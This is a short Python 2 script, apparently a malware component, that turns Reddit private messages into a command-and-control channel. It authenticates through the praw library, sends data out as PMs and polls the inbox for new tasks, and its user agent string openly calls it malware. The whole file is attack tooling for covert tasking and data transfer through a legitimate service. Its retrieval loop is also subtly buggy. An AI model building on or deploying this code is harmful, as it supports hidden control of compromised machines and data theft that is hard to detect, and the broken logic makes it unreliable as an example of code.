# Utilizes reddit PMs as a c2 channel
# Create a script app, and populate the config
# Pretty much just utilzies the 'praw' library, 'pip install praw'
# In this case, we're just gonna send messages to ourself, the user in USERNAME
# Messages are only deleted upon retrieval, regardless of role
# TODO: account for 10k character limit in PMs
import praw
from time import sleep

# START OF CONFIG
CLIENT_ID = ""
CLIENT_SECRET = ""
PASSWORD = ""
USER_AGENT = "I AM TOTALLY MALWARE by /u/"
USERNAME = ""
SUBJECT_NAME = "New4You" # Subject of PM
# END OF CONFIG

# IF YOU NEED DEBUG LOGGING:
# import logging

# handler = logging.StreamHandler()
# handler.setLevel(logging.DEBUG)
# logger = logging.getLogger('prawcore')
# logger.setLevel(logging.DEBUG)
# logger.addHandler(handler)
# </DEBUG LOGGING>

# Don't change this
global TASK_ID
TASK_ID = ""

def prepTransport():
	# Auth as a script app
	global reddit # DEBUG: Not sure if needed
	reddit = praw.Reddit(client_id=CLIENT_ID,
		client_secret=CLIENT_SECRET,
		password=PASSWORD,
		user_agent=USER_AGENT,
		username=USERNAME)
	# Debug, verify that we are connected
	print "We have successfully authenticated: %s" %(reddit)
	return reddit

def sendData(data):
	# Because we're keeping the taskid, we can easily support parsing multiple
	#    tasks later
	reddit.redditor(USERNAME).message(SUBJECT_NAME, data)
	return 0


def retrieveData():
	# Here, we're going to assume the only messages in the inbox with our 
	#   subject are relevant and contain a full task or response, requiring only one task at a time
	task = ""
	while True:
		for message in reddit.inbox.messages(limit=1):
			# Waiting for a new task
			if message.id <= TASK_ID:
				sleep(5)
				pass
			# Got our new task
			if message.subject == SUBJECT_NAME:
				task = message.body
				TASK_ID = message.id
				break
			# Hopefully you never hit this
			else:
				sleep(5)
				pass
	return task
